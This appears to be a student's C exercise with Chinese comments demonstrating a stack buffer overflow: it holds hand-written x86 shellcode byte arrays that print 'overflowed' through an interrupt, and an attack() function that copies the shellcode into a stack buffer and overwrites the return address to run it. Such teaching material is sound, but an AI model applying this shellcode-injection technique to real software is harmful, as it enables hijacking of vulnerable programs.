// #include "type.h"
// #include "stdio.h"
// #include "string.h"

// // char payload[] = {

// // };
// // 注意，在strcpy时遇到\0就会停止，所以不能填充0x00
char payload1[] = {
    0x55,
    0x89,0xe5,
    0x83,0xec,0x08,
    0x83,0xec,0x0c,
    0x68,0x78,0x18,0x00,0x00,
    0xe8,0x53,0x00,0x00,0x00,
    0x83,0xc4,0x10,
    0x90,
    0xc9,
    0xc3, //25 28+8
    0x00 //26
};

// void test(char *str){
//     char buf[20];

//     // 有点丑陋
//     strcpy(buf, payload);
//     strcpy(buf+14, payload+14);
//     strcpy(buf+19, payload+19);
//     int addr = buf;
//     buf[36] = (addr & 0xff);
//     buf[37] = ((addr >> 4) & 0xff);
//     buf[38] = ((addr >> 8) & 0xff);
//     buf[39] = ((addr >> 12) & 0xff);

//     // 如何获得buf的地址，丑陋但是简单
//     // int *addr = &buf[20];  // 注意，不是&buf
//     printf("%d %d %d\n", addr, buf, &buf);
//     // addr[3] = buf;
//     // addr[4] = buf;
//     // addr[5] = buf;
//     // buf[36] = (addr & 0xff);
//     // buf[37] = ((addr >> 4) & 0xff);
//     // buf[38] = ((addr >> 8) & 0xff);
//     // buf[39] = ((addr >> 12) & 0xff);
//     //strcpy(buf+31, addr);
// }

// void shellcode(){
//     printf("Bufferoverflow!\n");
// }

// int main(){
//     test(payload);
//     printf("Everything is OK.\n");
//     return 0;
// }

#include "stdio.h"
#include "string.h"

unsigned char payload2[]= {
    0x60, 0xeb, 0x0d, 0x5a, 0x31, 0xc0, 0xcd, 0x90,
    0x61, 0xbb, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xfe,
    0xe8, 0xee, 0xff, 0xff, 0xff, 0x20, 0x6f, 0x76,
    0x65, 0x72, 0x66, 0x6c, 0x6f, 0x77, 0x65, 0x64,
    0x0a, 0x00
};

unsigned char payload3[]= {
    0x60, 0xeb, 0x0c, 0x5a, 0x31, 0xc0, 0xcd, 0x90,
    0xbb, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xfe,
    0xe8, 0xef, 0xff, 0xff, 0xff, 0x6f, 0x76,
    0x65, 0x72, 0x66, 0x6c, 0x6f, 0x77, 
    0x0a, 0x00
};

unsigned char payload[]= {
    0x60, 0xeb, 0x07, 0x5a, 0x31, 0xc0, 0xcd, 0x90,
    0xeb, 0xfe, 
    0xe8, 0xf4, 0xff, 0xff, 0xff, 
    0x6f, 
    0x76, 0x65, 
    0x72, 0x66, 
    0x6c, 
    0x6f, 
    0x77, 0x0a, 0x00
};

int *p;
int i;
int j = 50000;

void attack(){
    unsigned char buf[60];
    p = &buf[60];  //指向缓冲区末尾的地址
    printf("==>addr: %d, %d", p, buf);
    // for(i = 0; i < 30; i ++){
    //     buf[i] = payload[i];
    // }
    strcpy(buf, payload);
    // strcpy(buf+13, payload3+13); //注意是14不是16
    p[3] = buf;
}

int main(){
    // unsigned char buf[60];
    // p = &buf[60];  //指向缓冲区末尾的地址
    // printf("==>addr: %d, %d", p, buf);
    // // for(i = 0; i < 30; i ++){
    // //     buf[i] = payload[i];
    // // }
    // strcpy(buf, payload);
    // // strcpy(buf+13, payload3+13); //注意是14不是16
    // p[4] = buf;
    // attack();
    for(int i = 0;i < 5000; i ++){
        ;
    }
    attack();
    return 0;
}
